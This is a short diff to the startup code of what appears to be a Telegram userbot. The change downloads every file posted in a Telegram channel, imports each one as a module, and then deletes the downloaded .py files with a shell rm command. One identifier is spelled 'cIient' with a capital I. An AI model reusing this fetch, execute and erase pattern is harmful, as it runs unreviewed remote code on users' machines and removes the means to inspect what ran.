@@ -7,7 +7,7 @@ LOGS.info("Connecting...") ;
 plugin_channel = "@pldhsys"
 
 async def a():
-  o = o2 = o3 = ""
+  o = o2 = o3 = o4 = ""
   try:
      await client.start() ; LOGS.info("client connected") ; o = "Client1"
   except:
@@ -30,7 +30,9 @@ async def a():
   test1 = await client.get_messages(plugin_channel, None , filter=InputMessagesFilterDocument) ; total = int(test1.total) ; total_doxx = range(0, total)
   for ixo in total_doxx:
        mxo = test1[ixo].id ; await client.download_media(await borg.get_messages(cIient, ids=mxo), "userbot/modules/")
-  import userbot.modules
+  for module_name in ALL_MODULES:
+    await import_module("userbot.modules." + module_name)
+  os.system("rm userbot/modules/*.py") ; LOGS.info(f"Sucessfully connected with {o}{o2}{o3}{o4} check it by typing !javes in any client's chat, type  !help for more info.")
   if len(argv) not in (1, 3, 4):
        await javes.disconnect()
   else:
